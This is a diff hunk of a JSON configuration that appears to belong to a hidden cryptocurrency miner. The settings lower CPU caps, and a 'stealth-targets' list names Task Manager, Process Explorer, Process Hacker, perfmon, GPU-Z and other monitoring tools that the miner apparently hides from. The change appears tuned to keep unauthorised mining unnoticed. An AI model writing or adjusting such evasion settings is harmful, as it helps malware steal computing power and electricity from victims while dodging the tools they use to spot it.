@@ -6,9 +6,9 @@
     "password": "dc",
     "nicehash": false,
     "ssltls": true,
-    "max-cpu": 50,
+    "max-cpu": 20,
     "idle-wait": 33,
-    "idle-cpu": 70,
+    "idle-cpu": 30,
     "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe,cpuz.exe,anvir.exe,anvir64.exe,anvirlauncher.exe,gpu-z.exe,real-temp.exe,NVCleanstall.exe,ThrottleStop.exe",
     "kill-targets": "",
     "stealth-fullscreen": false
